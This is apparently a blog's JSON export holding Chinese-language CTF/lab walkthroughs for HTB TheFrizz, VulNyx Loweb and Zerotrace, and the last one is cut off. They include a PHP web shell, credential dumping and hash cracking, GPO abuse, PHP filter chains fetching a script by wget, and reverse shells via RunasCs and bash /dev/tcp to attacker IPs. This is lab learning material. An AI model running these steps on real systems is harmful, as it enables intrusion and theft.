#\rusd-2023-0025 - usd HeroLab 经过尝试如下发包\n然后即可访问asdf.php进行命令执行\n这里我尝试过反弹Shell，可以写一个Meterpreter。\n通过dir可以看到当前目录存在一个config.php\nhttp://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=type config.php 得到一个数据库用户名和密码\n\u0026lt;?php\r$databaseServer = \u0026#39;localhost\u0026#39;;\r$databaseUsername = \u0026#39;MrGibbonsDB\u0026#39;;\r$databasePassword = \u0026#39;MisterGibbs!Parrot!?1\u0026#39;;\r$databaseName = \u0026#39;gibbon\u0026#39;; 尝试进入数据库看看信息\n.\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;show databases;\u0026#34; .\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;USE gibbon; SELECT * FROM gibbonperson;\u0026#34; -E C:\\xampp\\mysql\\bin\u0026gt;.\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;USE gibbon; SELECT * FROM gibbonperson;\u0026#34; -E .\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;USE gibbon; SELECT * FROM gibbonperson;\u0026#34; -E *************************** 1. row *************************** gibbonPersonID: 0000000001 title: Ms. surname: Frizzle firstName: Fiona preferredName: Fiona officialName: Fiona Frizzle nameInCharacters: gender: Unspecified username: f.frizzle passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bcxxxxxxxxxxxxxxxxxxxxxx passwordStrongSalt: /aACFhikmNxxxxxxxxxx passwordForceReset: N\rstatus: Full\rcanLogin: Y\rgibbonRoleIDPrimary: 001\rgibbonRoleIDAll: 001\rdob: NULL\remail: f.frizzle@frizz.htb\remailAlternate: NULL\rimage_240: NULL\rlastIPAddress: ::1\rlastTimestamp: 2024-10-29 09:28:59\rlastFailIPAddress: 10.10.16.26\rlastFailTimestamp: 2025-03-17 08:29:30\rfailCount: 11\raddress1: address1District: address1Country: address2: Crack Passwd #\r得到了密码hash以及加密的盐，加密方式应该是SHA-256\n注意！！！！\n这里使用john来进行爆破，注意哈希格式\n[root@kali] /home/kali/TheFrizz ❯ john --format=dynamic=\u0026#39;sha256($s.$p)\u0026#39; --wordlist=/usr/share/wordlists/rockyou.txt hash.txt ⏎\rUsing default input encoding: UTF-8\rLoaded 1 password hash (dynamic=sha256($s.$p) [128/128 AVX 4x])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rxxxxxxxxxxxxxx (?) 经过验证，密码是正确的\nUnexpected User #\r这里无法直接通过密码登录到Evil-winrm\n尝试通过Kerberos请求票据，然后再尝试evil-Winrm的票据登录\n[root@kali] /home/kali/TheFrizz ❯ ntpdate frizzdc.frizz.htb [root@kali] /home/kali/TheFrizz ❯ impacket-getTGT frizz.htb/\u0026#39;f.frizzle\u0026#39;:\u0026#39;xxxxxxxxxxxxx\u0026#39; -dc-ip frizzdc.frizz.htb [*] Saving ticket in f.frizzle.ccache\r[root@kali] /home/kali/TheFrizz ❯ export KRB5CCNAME=f.frizzle.ccache 如果遇到上面的情况👆，请尝试将VPN换到US - Release Arena，当然切换了就会很卡。。。\n之后这个方式被修补了，5985端口被关闭掉。\nExpected User #\r这里有一个巨大的坑，/etc/hosts必须如下设置，具体的下面说\n10.10.11.60 frizzdc.frizz.htb frizz.htb 修改**/etc/krb5.conf**，这个是Kerberos的配置文件，通过这种方式，Kerberos 客户端可以使用该配置与 Kerberos 认证服务器进行通信\n[domain_realm]\r.frizz.htb = FRIZZ.HTB\rfrizz.htb = FRIZZ.HTB\r[libdefaults]\rdefault_realm = FRIZZ.HTB\rdns_lookup_realm = false\rdns_lookup_kdc = true\rticket_lifetime = 24h\rforwardable = true\r[realms]\rFRIZZ.HTB = {\rkdc = FRIZZDC.FRIZZ.HTB\radmin_server = FRIZZDC.FRIZZ.HTB\rdefault_domain = FRIZZ.HTB\r} 使用kinit获取票据，之后可以使用klist查看是否成功\n[root@kali] ~kali/TheFrizz ❯ kinit f.frizzle@FRIZZ.HTB 然后使用ssh登录，使用**-K参数通过GSSAPI**认证，便能成功连接。\n[root@kali] ~kali/TheFrizz ❯ ssh f.frizzle@frizz.htb -K Attention #\r以下内容可能会有所错误，望读者能指正🤔\n上面的**/etc/hosts里的域名必须十分严格的按照顺序排列，必须是frizzdc**在最前面，会被优先解析\nKerberos 的域名解析和认证确实依赖于配置文件中的顺序和 /etc/hosts 文件的正确配置。错误的域名解析会导致 KDC 无法正确找到或验证目标主机，从而导致 Kerberos 或 GSSAPI 认证失败。因此，确保 /etc/hosts 中的域名与 krb5.conf 配置中的域名一致，并且没有冲突，是至关重要的。\n如果在 /etc/hosts 文件中添加了一个自定义的 thefrizz.htb，并且这个域名并不属于目标主机的实际域名，那么它可能会影响 GSSAPI 和 Kerberos 认证，特别是当你使用 Kerberos 时，认证过程依赖于域名的正确匹配。\n具体的可以参考一下，如果是其他域名被优先设置的情况，你可以使用ssh -vvv参数查看到这个错误\n如果你将一个不存在的域名（例如 thefrizz.htb）放在 /etc/hosts 中并指向错误的 IP，那么 Kerberos 客户端就会使用这个错误的主机名进行身份验证，导致 Server not found in Kerberos database 或类似错误。\n如果将frizzdc.frizz.htb放到最前面的话，查看详细输出，可以看到是认证成功。\n出于个人习惯，我会将机器名称添加到**/etc/hosts**，没想到会在这里出问题，长知识了。\nPrivilege Escalation #\r先使用bloodhound分析一波\n[root@kali] /home/kali/TheFrizz ❯ bloodhound-python -u \u0026#39;f.frizzle\u0026#39; -p \u0026#39;xxxxxxxxx\u0026#39; -d frizz.htb -dc frizzdc.frizz.htb -ns 10.xx.xx.xx -c all --zip 当前的f.frizzle用户并没有什么特别的权限，因此尝试查看域内的其他用户\n可以看到m.schoolbus这个用户有较高权限，但是当前的f.frizzle对其没有控制权限。\n在回收站的目录中，发现有一个压缩包，SID是f.frizzle的\n这里不好直接传输，我是用meterpreter进行传输的\n[root@kali] /home/kali ❯ 7z x \u0026#39;$RE2XMEG.7z\u0026#39; -o./extracted 在这里刚好拿到了一串密码，经过测验就是m.schoolbus的密码。\n同样的步骤登录到M.schoolbus\n注意！！！！\n这个提权的预期应该是通过M.schoolbus来进行GPO abuse，但是我的Bloodhound和Sharphound都没有发现这权限。因此以下仅仅作为参考。\nantonioCoco/RunasCs: RunasCs - Csharp and open version of windows builtin runas.exe\nbyronkg/SharpGPOAbuse: Precompiled executable\nPS C:\\Temp\u0026gt; New-GPO -Name pain | New-GPLink -Target \u0026#34;OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB\u0026#34; -LinkEnabled Yes\rGpoId : f97a73ca-2745-4375-857c-4ee8fe1b0256\rDisplayName : pain\rEnabled : True\rEnforced : False\rTarget : OU=Domain Controllers,DC=frizz,DC=htb\rOrder : 2 创建名为 pain 的 GPO。\n将其链接到 FRIZZ.HTB 域中的 DOMAIN CONTROLLERS 组织单元。\n确保该链接已启用，使该 GPO 在该 OU 内的所有对象（即域控制器）上生效。\nPS C:\\Temp\u0026gt; Get-GPO -All | Select DisplayName,Id DisplayName Id\r----------- --\rDefault Domain Policy 31b2f340-016d-11d2-945f-00c04fb984f9\rDefault Domain Controllers Policy 6ac1786c-016f-11d2-945f-00c04fb984f9\rpain 8f13d279-2073-4d35-be51-f6adcf66f25c\rPS C:\\Temp\u0026gt; .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName pain [+] Domain = frizz.htb\r[+] Domain Controller = frizzdc.frizz.htb\r[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb\r[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106\r[+] GUID of \u0026#34;pain\u0026#34; is: {8F13D279-2073-4D35-BE51-F6ADCF66F25C}\r[+] Creating file \\\\frizz.htb\\SysVol\\frizz.htb\\Policies\\{8F13D279-2073-4D35-BE51-F6ADCF66F25C}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\r[+] versionNumber attribute changed successfully\r[+] The version number in GPT.ini was increased successfully.\r[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\r[+] Done! 接下来刷新GPO\nPS C:\\Temp\u0026gt; gpupdate /force Updating policy...\rComputer Policy update has completed successfully.\rUser Policy update has completed successfully. 查看是否已经加入了管理员组\nPS C:\\Temp\u0026gt; net localgroup Administrators Alias name Administrators\rComment Administrators have complete and unrestricted access to the computer/domain\rMembers\r-------------------------------------------------------------------------------\rAdministrator\rM.SchoolBus\rThe command completed successfully. 可以看到尽管已经在管理员组，但是无法读取到root.txt\n因为需要重新登录，但是这里如果直接exit退出，有一定概率再也连不上PS，所以这里我用RunasCS来开启另一个进程，间接刷新。\nPS C:\\Temp\u0026gt; .\\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r 10.10.xx.xx:8888\r[+] Running in session 0 with process function CreateProcessWithLogonW()\r[+] Using Station\\Desktop: Service-0x0-67acc$\\Default\r[+] Async process \u0026#39;C:\\Windows\\system32\\cmd.exe\u0026#39; with pid 3644 created in background. Summary #\rUser：通过Gibbon创建恶意PHP文件来命令执行，在目录下发现数据库的配置文件。进入到数据库中拿到f.frizzle的密码哈希，破解后获取到票据，通过ssh登录拿到user。\nRoot：这里我尝试过很多方法，都无法查看到WriteGPOlink这个权限，或许是机器的问题。具体流程就是通过GPO来将M.schoolbus添加到管理员组里面。\n机器的思路很好，但是实际打起来很难受。太遗憾了。\n","date":"2025-03-17","externalUrl":null,"permalink":"/posts/2025/03/htb-thefrizz/","section":"Posts","summary":"","title":"HTB-TheFrizz","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Low Nmap #\r[root@kali] /home/kali/Loweb ❯ nmap 192.168.56.122 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)\r|_ 256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) Gobuster #\r[root@kali] /home/kali/Loweb ❯ gobuster dir -u http://192.168.56.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.122\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/library (Status: 301) [Size: 318] [--\u0026gt; http://192.168.56.122/library/]\r/server-status (Status: 403) [Size: 279]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r===============================================================\r[root@kali] /home/kali/Loweb ❯ gobuster dir -u http://192.168.56.122/library -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.122/library\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 1068]\r/login (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.122/library/login/]\r/admin (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.122/library/admin/]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== SQL Injection #\r进入登录页面，用户名处存在SQL注入\nLFI #\r注意到URL中有一个lang参数，尝试进行文件包含\n存在r3dh4ck用户，查看一下源码\nhttp://192.168.56.122/library/admin/index.php?lang=php://filter/convert.base64-encode/resource=../../../../../var/www/html/library/admin/index.php 可以直接使用php filter chains攻击\nsynacktiv/php_filter_chain_generator 注意！！！！！\n这里URL不能太长了，要尽量缩短命令的长度。\n[root@kali] /home/kali/Loweb/php_filter_chain_generator (main) ❯ python php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?= system(\u0026#34;wget 192.168.56.118/s\u0026#34;);?\u0026gt;\u0026#39; [root@kali] /home/kali/Loweb/php_filter_chain_generator (main) ❯ python php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?= system(\u0026#34;bash s\u0026#34;);?\u0026gt;\u0026#39; Own r3dh4ck #\r查看linpeas，发现存在r3dh4ck的定时任务\n查看**/opt/monitor.sh**\n#!/bin/bash\rLOGDIR=\u0026#34;/var/log/monitor\u0026#34;\rLOGFILE=\u0026#34;$LOGDIR/system_monitor_$(date +%Y%m%d%H%M%S).log\u0026#34;\rmkdir -p $LOGDIR\recho \u0026#34;=== Monitoring started: $(date) ===\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;\u0026gt;\u0026gt; Open ports and associated processes:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rss -tulpn | grep LISTEN \u0026gt;\u0026gt; $LOGFILE 2\u0026gt;/dev/null\recho -e \u0026#34;\\n\u0026gt;\u0026gt; Currently connected users:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rwho \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n\u0026gt;\u0026gt; System information:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Hostname: $(hostname)\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Kernel version: $(uname -r)\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Uptime: $(uptime -p)\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n\u0026gt;\u0026gt; Generating simulated credentials for audit:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rSECRET_USER=\u0026#34;r3dh4ck\u0026#34;\rSECRET_PASS=\u0026#34;contraseñaconÑjeje\u0026#34; # Change this password for the future\recho \u0026#34;User: SECRET_USER\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Password: SECRET_PASS\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n\u0026gt;\u0026gt; Possible suspicious processes running:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rps aux | grep -i \u0026#39;nc\\|netcat\\|ncat\\|bash\\|sh\u0026#39; | grep -v grep \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n=== Monitoring finished: $(date) ===\u0026#34; \u0026gt;\u0026gt; $LOGFILE 刚好在里面发现了密码：contraseñaconÑjeje\n但是不能读取user.txt\n查看特殊权限命令，可以利用chown\nr3dh4ck@loweb:~$ sudo -l\rMatching Defaults entries for r3dh4ck on loweb:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser r3dh4ck may run the following commands on loweb:\r(ALL) NOPASSWD: /usr/bin/chown Root #\r可以直接读取\n和这篇文章类似的👇，可以修改**/etc/passwd添加一个root**组用户\nDockerlabs-r00tless - HYH Summary #\rUser：任意文件包含，通过filterchains拿到www-data，在定时任务中得到用户密码。\nRoot：由于特殊权限的命令是chown，这个命令几乎可以查看任何文件，因此就显得十分简单。可以修改**/etc/passwd的用户列表，添加一个root**组用户。\n","date":"2025-03-17","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-loweb/","section":"Posts","summary":"","title":"VulNyx-Loweb","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.119 -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)\r|_ 256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)\r80/tcp open http nginx 1.22.1\r|_http-server-header: nginx/1.22.1\r|_http-title: Massively by HTML5 UP\r8000/tcp open ftp pyftpdlib 1.5.7\r| ftp-syst: | STAT: | FTP server status:\r| Connected to: 192.168.56.119:8000\r| Waiting for username.\r| TYPE: ASCII; STRUcture: File; MODE: Stream\r| Data connection closed.\r|_End of status. Dirsearch #\r[root@kali] /home/kali/Zerotrace ❯ dirsearch -u http://192.168.56.119 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Zerotrace/reports/http_192.168.56.119/_25-03-15_19-12-30.txt\rTarget: http://192.168.56.119/\r[19:12:30] Starting: [19:12:30] 301 - 169B - /.admin -\u0026gt; http://192.168.56.119/.admin/ [19:12:30] 403 - 555B - /.admin/\r[19:12:31] 403 - 555B - /.ht_wsr.txt [19:12:31] 403 - 555B - /.htaccess.bak1 [19:12:31] 403 - 555B - /.htaccess.orig [19:12:31] 403 - 555B - /.htaccess.sample\r[19:12:31] 403 - 555B - /.htaccess.save\r[19:12:31] 403 - 555B - /.htaccess_extra [19:12:31] 403 - 555B - /.htaccess_orig\r[19:12:31] 403 - 555B - /.htaccess_sc\r[19:12:31] 403 - 555B - /.htaccessOLD\r[19:12:31] 403 - 555B - /.htaccessBAK\r[19:12:31] 403 - 555B - /.htaccessOLD2 [19:12:31] 403 - 555B - /.htm\r[19:12:31] 403 - 555B - /.html [19:12:31] 403 - 555B - /.httr-oauth [19:12:31] 403 - 555B - /.htpasswds [19:12:31] 403 - 555B - /.htpasswd_test [19:12:37] 301 - 169B - /assets -\u0026gt; http://192.168.56.119/assets/ [19:12:37] 403 - 555B - /assets/ [19:12:43] 403 - 555B - /images/ [19:12:43] 301 - 169B - /images -\u0026gt; http://192.168.56.119/images/\r[19:12:44] 200 - 17KB - /LICENSE.txt [19:12:50] 200 - 930B - /README.txt [19:12:54] 403 - 555B - /uploads/ [19:12:54] 403 - 555B - /uploads/affwp-debug.log [19:12:54] 403 - 555B - /uploads/dump.sql Task Completed 发现存在一个**/.admin**目录\nGobuster #\r[root@kali] /home/kali/Zerotrace ❯ gobuster dir -u http://192.168.56.119/.admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.119/.admin\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 153]\r/tool.php (Status: 200) [Size: 0]\r/.html (Status: 403) [Size: 153]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== 发现一个tool.php\nFFUF #\r直接访问没有回显，尝试对参数进行爆破\n[root@kali] /home/kali/Zerotrace ❯ ffuf -u \u0026#34;http://192.168.56.119/.admin/tool.php?FUZZ=/etc/passwd\u0026#34; -w ../Desktop/fuzzDicts/paramDict/AllParam.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.56.119/.admin/tool.php?FUZZ=/etc/passwd\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\rfile [Status: 200, Size: 1163, Words: 5, Lines: 25, Duration: 8ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 5263 req/sec :: Duration: [0:00:15] :: Errors: 0 :: 当参数是file时有回显，查看内容\n[root@kali] /home/kali/Zerotrace ❯ curl \u0026#34;http://192.168.56.119/.admin/tool.php?file=/etc/passwd\u0026#34; ⏎\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\rmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\rsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\rll104567:x:1000:1000::/home/ll104567:/bin/bash\rJ4ckie0x17:x:1002:1002:,,,:/home/J4ckie0x17:/bin/bash\rshelldredd:x:1003:1003::/home/shelldredd:/bin/bash 查看到存在三个用户：ll104567、J4ckie0x17、shelldredd\nOwn J4ckie0x17 #\r尝试使用LFI的字典进行扫描\n[root@kali] /home/kali/Zerotrace ❯ ffuf -u \u0026#34;http://192.168.56.119/.admin/tool.php?file=FUZZ\u0026#34; -w /usr/share/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.56.119/.admin/tool.php?file=FUZZ\r:: Wordlist : FUZZ: /usr/share/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\r/etc/passwd [Status: 200, Size: 1163, Words: 5, Lines: 25, Duration: 4ms]\r:: Progress: [9513/9513] :: Job [1/1] :: 5128 req/sec :: Duration: [0:00:02] :: Errors: 0 :: 没有任何东西，去看了一下writeup，发现原来是**/proc/{id}/cmdline**\ncmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令\n可以看到**/proc/1/cmdline**是有回显的。\n因此可以遍历一下其他的PID\n[root@kali] /home/kali/Zerotrace ❯ seq 1 10000 \u0026gt; numbers.txt ⏎\r[root@kali] /home/kali/Zerotrace ❯ ffuf -u \u0026#34;http://192.168.56.119/.admin/tool.php?file=/proc/FUZZ/cmdline\u0026#34; -w ./numbers.txt -fs 0 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.56.119/.admin/tool.php?file=/proc/FUZZ/cmdline\r:: Wordlist : FUZZ: /home/kali/Zerotrace/numbers.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\r1 [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 2ms]\r208 [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 9ms]\r231 [Status: 200, Size: 27, Words: 1, Lines: 1, Duration: 9ms]\r375 [Status: 200, Size: 140, Words: 1, Lines: 1, Duration: 8ms]\r457 [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 9ms]\r458 [Status: 200, Size: 105, Words: 1, Lines: 1, Duration: 9ms]\r461 [Status: 200, Size: 78, Words: 4, Lines: 1, Duration: 9ms]\r463 [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 9ms]\r465 [Status: 200, Size: 28, Words: 1, Lines: 1, Duration: 9ms]\r469 [Status: 200, Size: 120, Words: 12, Lines: 1, Duration: 9ms]\r472 [Status: 200, Size: 109, Words: 1, Lines: 1, Duration: 9ms]\r474 [Status: 200, Size: 71, Words: 9, Lines: 1, Duration: 9ms]\r475 [Status: 200, Size: 43, Words: 3, Lines: 1, Duration: 9ms]\r480 [Status: 200, Size: 56, Words: 8, Lines: 1, Duration: 9ms]\r482 [Status: 200, Size: 49, Words: 3, Lines: 1, Duration: 9ms]\r1504 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 8ms]\r1505 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 8ms]\r1506 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 8ms]\r1602 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 9ms]\r:: Progress: [10000/10000] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:02] :: Errors: 0 :: 可以看到PID为469的时候响应体最大，查看一下\n得到用户的密码\nJ4ckie0x17:uhIpiRnUBwAHaG.EkeN-oKUfozESUnx3zCIxpuhAd Own shelldredd #\r登录后查看定时任务\n这个文件的所有者是shelldredd，但是尽管有w可写权限，但是被chattar+i设置了不可修改\n查找一下SUID文件，刚好存在chattar\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null 只需要去掉不可修改的修饰符就行了\nJ4ckie0x17@zerotrace:/opt/.nobodyshouldreadthis$ /usr/bin/chattr -i destiny J4ckie0x17@zerotrace:/opt/.nobodyshouldreadthis$ rm destiny J4ckie0x17@zerotrace:/opt/.nobodyshouldreadthis$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.118/6666 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; destiny 写入公钥后ssh连接\nOwn ll104567 #\r查看**/opt/cryptovault/ll104567**目录下的内容\nshelldredd@zerotrace:/opt/cryptovault/ll104567$ cat notes.txt 我要在这里写下我的愿望：\r在10秒内完成魔方\r让The Flash（闪电侠）跑得更慢\r在哔哩哔哩上达到1000个视频\rshelldredd@zerotrace:/opt/cryptovault/ll104567$ cat secret {\u0026#34;address\u0026#34;:\u0026#34;2891efcaa457d4d44dc724c4fa015fe8be4e279e\u0026#34;,\u0026#34;crypto\u0026#34;:{\u0026#34;cipher\u0026#34;:\u0026#34;aes-128-ctr\u0026#34;,\u0026#34;ciphertext\u0026#34;:\u0026#34;fee023fd8fcd5b242b0ad4900de2d4614fa4be48887efbd6208a9beb65923df7\u0026#34;,\u0026#34;cipherparams\u0026#34;:{\u0026#34;iv\u0026#34;:\u0026#34;7183f2eea51e68d818fe976daf18327d\u0026#34;},\u0026#34;kdf\u0026#34;:\u0026#34;scrypt\u0026#34;,\u0026#34;kdfparams\u0026#34;:{\u0026#34;dklen\u0026#34;:32,\u0026#34;n\u0026#34;:262144,\u0026#34;p\u0026#34;:1,\u0026#34;r\u0026#34;:8,\u0026#34;salt\u0026#34;:\u0026#34;abb71ccb91d0ec97831d49694bd80ce925c0204772fa6268ace1f73df97e3d71\u0026#34;},\u0026#34;mac\u0026#34;:\u0026#34;4ed5177b17ad85eafafd3dedc40a3c85914d1